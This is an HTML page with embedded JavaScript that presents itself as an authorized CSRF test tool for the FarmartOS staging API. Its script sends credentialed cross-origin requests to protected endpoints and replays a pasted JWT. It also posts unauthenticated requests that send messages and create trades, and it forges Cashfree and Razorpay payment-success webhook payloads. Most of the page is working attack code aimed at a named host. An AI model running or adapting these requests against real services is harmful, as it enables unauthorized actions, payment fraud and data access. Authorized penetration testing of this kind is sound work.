<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FarmartOS CSRF Security Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .header {
            background: #e74c3c;
            color: white;
            padding: 15px;
            border-radius: 5px;
            text-align: center;
            margin-bottom: 20px;
        }
        .warning {
            background: #f39c12;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .test-section {
            border: 1px solid #ddd;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
        }
        .test-section h3 {
            margin-top: 0;
            color: #2c3e50;
        }
        input[type="text"] {
            width: 100%;
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background: #3498db;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background: #2980b9;
        }
        .danger {
            background: #e74c3c;
        }
        .danger:hover {
            background: #c0392b;
        }
        .success {
            background: #27ae60;
        }
        .success:hover {
            background: #229954;
        }
        #results {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 400px;
            overflow-y: auto;
        }
        .status-200 { color: #27ae60; font-weight: bold; }
        .status-401 { color: #e74c3c; font-weight: bold; }
        .status-403 { color: #f39c12; font-weight: bold; }
        .cors-allowed { color: #e74c3c; font-weight: bold; }
        .cors-blocked { color: #27ae60; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>üîí FarmartOS CSRF Security Test</h1>
        <p>Authorized Security Testing Tool</p>
    </div>

    <div class="warning">
        ‚ö†Ô∏è <strong>WARNING:</strong> This tool is for authorized security testing only. 
        Use only on systems you own or have explicit permission to test.
    </div>

    <div class="container">
        <h2>üéØ Target Configuration</h2>
        <div class="test-section">
            <h3>FarmartOS Stage Environment</h3>
            <p><strong>Target URL:</strong> https://ml-stage.farmartos.com</p>
            <p><strong>Test Date:</strong> <span id="testDate"></span></p>
            <p><strong>Test Origin:</strong> <span id="testOrigin"></span></p>
        </div>
    </div>

    <div class="container">
        <h2>üîç CSRF Vulnerability Tests</h2>
        
        <div class="test-section">
            <h3>Test 1: Basic CORS & CSRF Check</h3>
            <p>Tests if cross-origin requests are allowed without authentication.</p>
            <button onclick="testBasicCSRF()">Run Basic CSRF Test</button>
        </div>

        <div class="test-section">
            <h3>Test 2: Protected Endpoint Access</h3>
            <p>Tests access to protected endpoints without authentication.</p>
            <button onclick="testProtectedEndpoints()">Test Protected Endpoints</button>
        </div>

        <div class="test-section">
            <h3>Test 3: Token-Based CSRF Attack</h3>
            <p>Tests CSRF with a valid JWT token (paste token below).</p>
            <input type="text" id="jwtToken" placeholder="Paste JWT token here (Bearer token only, without 'Bearer ' prefix)">
            <br>
            <button onclick="testTokenBasedCSRF()" class="danger">Test CSRF with Token</button>
        </div>

        <div class="test-section">
            <h3>Test 4: State-Changing Operations</h3>
            <p>Tests CSRF on endpoints that modify data.</p>
            <button onclick="testStateChangingOperations()" class="danger">Test State-Changing CSRF</button>
        </div>

        <div class="test-section">
            <h3>Test 5: Webhook Spoofing</h3>
            <p>Tests CSRF on webhook endpoints.</p>
            <button onclick="testWebhookSpoofing()" class="danger">Test Webhook CSRF</button>
        </div>
    </div>

    <div class="container">
        <h2>üìä Test Results</h2>
        <div id="results">Click any test button above to see results here...</div>
        <br>
        <button onclick="clearResults()" class="success">Clear Results</button>
        <button onclick="exportResults()" class="success">Export Results</button>
    </div>

    <script>
        // Initialize test environment
        document.getElementById('testDate').textContent = new Date().toISOString();
        document.getElementById('testOrigin').textContent = window.location.origin;

        const TARGET_BASE = 'https://ml-stage.farmartos.com';
        let testResults = [];

        function log(message, type = 'info') {
            const timestamp = new Date().toISOString();
            const logEntry = `[${timestamp}] ${message}`;
            testResults.push(logEntry);
            
            const resultsDiv = document.getElementById('results');
            const colorClass = type === 'error' ? 'status-401' : 
                              type === 'success' ? 'status-200' : 
                              type === 'warning' ? 'status-403' : '';
            
            resultsDiv.innerHTML += `<div class="${colorClass}">${logEntry}</div>`;
            resultsDiv.scrollTop = resultsDiv.scrollHeight;
        }

        function clearResults() {
            document.getElementById('results').innerHTML = '';
            testResults = [];
        }

        function exportResults() {
            const results = testResults.join('\n');
            const blob = new Blob([results], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `csrf-test-results-${new Date().toISOString().split('T')[0]}.txt`;
            a.click();
            URL.revokeObjectURL(url);
        }

        async function testBasicCSRF() {
            log('=== BASIC CSRF TEST STARTED ===');
            
            try {
                // Test 1: Unauthenticated endpoint (no auth required)
                log('Testing unauthenticated endpoint: /v1/distributer/distributers');
                const response1 = await fetch(`${TARGET_BASE}/v1/distributer/distributers`, {
                    method: 'GET',
                    credentials: 'include'
                });
                
                log(`Response Status: ${response1.status}`, response1.status === 200 ? 'success' : 'warning');
                log(`CORS Header: ${response1.headers.get('Access-Control-Allow-Origin') || 'Not set'}`);
                
                if (response1.headers.get('Access-Control-Allow-Origin') === '*') {
                    log('üö® VULNERABILITY: CORS allows all origins (*)', 'error');
                } else {
                    log('‚úÖ CORS properly configured', 'success');
                }
                
                const data1 = await response1.text();
                log(`Response Body: ${data1.substring(0, 200)}...`);
                
            } catch (error) {
                log(`‚ùå CORS Error: ${error.message}`, 'error');
                log('‚úÖ CSRF protection working - requests blocked', 'success');
            }
            
            log('=== BASIC CSRF TEST COMPLETED ===\n');
        }

        async function testProtectedEndpoints() {
            log('=== PROTECTED ENDPOINTS TEST STARTED ===');
            
            const protectedEndpoints = [
                '/v3/trade/',
                '/v3/message/template',
                '/v3/retailer/docs',
                '/v1/access_control/all_permission_list',
                '/v3/farmer/',
                '/v3/distributer/fertilizer/',  // This one requires auth
                '/v1/distributer/distributers'  // This one doesn't require auth
            ];
            
            for (const endpoint of protectedEndpoints) {
                try {
                    log(`Testing protected endpoint: ${endpoint}`);
                    const response = await fetch(`${TARGET_BASE}${endpoint}`, {
                        method: 'GET',
                        credentials: 'include'
                    });
                    
                    log(`Status: ${response.status}`, response.status === 200 ? 'warning' : 'success');
                    
                    if (response.status === 200) {
                        const data = await response.text();
                        if (data.includes('Token not supplied')) {
                            log('üö® VULNERABILITY: Returns 200 instead of 401/403', 'error');
                        }
                    }
                    
                } catch (error) {
                    log(`Error: ${error.message}`, 'error');
                }
            }
            
            log('=== PROTECTED ENDPOINTS TEST COMPLETED ===\n');
        }

        async function testTokenBasedCSRF() {
            const token = document.getElementById('jwtToken').value.trim();
            
            if (!token) {
                log('‚ùå Please enter a JWT token first', 'error');
                return;
            }
            
            log('=== TOKEN-BASED CSRF TEST STARTED ===');
            log(`Using token: ${token.substring(0, 50)}...`);
            
            try {
                // Test protected endpoint with token
                const response = await fetch(`${TARGET_BASE}/v3/trade/`, {
                    method: 'GET',
                    headers: {
                        'Authorization': `Bearer ${token}`,
                        'Content-Type': 'application/json'
                    }
                });
                
                log(`Protected endpoint status: ${response.status}`, response.status === 200 ? 'success' : 'warning');
                
                if (response.status === 200) {
                    log('üö® VULNERABILITY: CSRF attack successful with valid token', 'error');
                    const data = await response.text();
                    log(`Response: ${data.substring(0, 300)}...`);
                }
                
            } catch (error) {
                log(`Error: ${error.message}`, 'error');
            }
            
            log('=== TOKEN-BASED CSRF TEST COMPLETED ===\n');
        }

        async function testStateChangingOperations() {
            log('=== STATE-CHANGING OPERATIONS TEST STARTED ===');
            
            const stateChangingEndpoints = [
                {
                    url: '/v3/message/send',
                    method: 'POST',
                    body: {
                        "message": `CSRF Test Message - ${new Date().toISOString()}`,
                        "recipient": "919999999999"
                    }
                },
                {
                    url: '/v3/trade/create',
                    method: 'POST',
                    body: {
                        "crop_id": 1,
                        "quantity": 100,
                        "price": 5000
                    }
                }
            ];
            
            for (const test of stateChangingEndpoints) {
                try {
                    log(`Testing state-changing endpoint: ${test.method} ${test.url}`);
                    
                    const response = await fetch(`${TARGET_BASE}${test.url}`, {
                        method: test.method,
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(test.body)
                    });
                    
                    log(`Status: ${response.status}`, response.status === 200 ? 'error' : 'success');
                    
                    if (response.status === 200) {
                        log('üö® CRITICAL: State-changing operation succeeded without auth!', 'error');
                    }
                    
                } catch (error) {
                    log(`Error: ${error.message}`, 'error');
                }
            }
            
            log('=== STATE-CHANGING OPERATIONS TEST COMPLETED ===\n');
        }

        async function testWebhookSpoofing() {
            log('=== WEBHOOK SPOOFING TEST STARTED ===');
            
            const webhookEndpoints = [
                {
                    url: '/v1/webhooks/cashfree_webhook',
                    method: 'POST',
                    body: {
                        "type": "PAYMENT_SUCCESS",
                        "data": {
                            "order_id": "test_order_123",
                            "amount": 1000,
                            "status": "SUCCESS"
                        }
                    }
                },
                {
                    url: '/v3/sms_recharge/webhook_razorpay/captured',
                    method: 'POST',
                    body: {
                        "payload": {
                            "payment": {
                                "entity": {
                                    "id": "pay_test123",
                                    "contact": "+919999999999",
                                    "amount": 10000,
                                    "currency": "INR",
                                    "email": "test@example.com"
                                }
                            }
                        }
                    }
                }
            ];
            
            for (const webhook of webhookEndpoints) {
                try {
                    log(`Testing webhook: ${webhook.method} ${webhook.url}`);
                    
                    const response = await fetch(`${TARGET_BASE}${webhook.url}`, {
                        method: webhook.method,
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(webhook.body)
                    });
                    
                    log(`Status: ${response.status}`, response.status === 200 ? 'error' : 'success');
                    
                    if (response.status === 200) {
                        log('üö® CRITICAL: Webhook spoofing successful!', 'error');
                        const data = await response.text();
                        log(`Response: ${data}`);
                    }
                    
                } catch (error) {
                    log(`Error: ${error.message}`, 'error');
                }
            }
            
            log('=== WEBHOOK SPOOFING TEST COMPLETED ===\n');
        }

        // Auto-run basic test on page load
        window.onload = function() {
            log('üîí FarmartOS CSRF Security Test Tool Loaded');
            log('Target: https://ml-stage.farmartos.com');
            log('Origin: ' + window.location.origin);
            log('Ready for testing...\n');
        };
    </script>
</body>
</html>
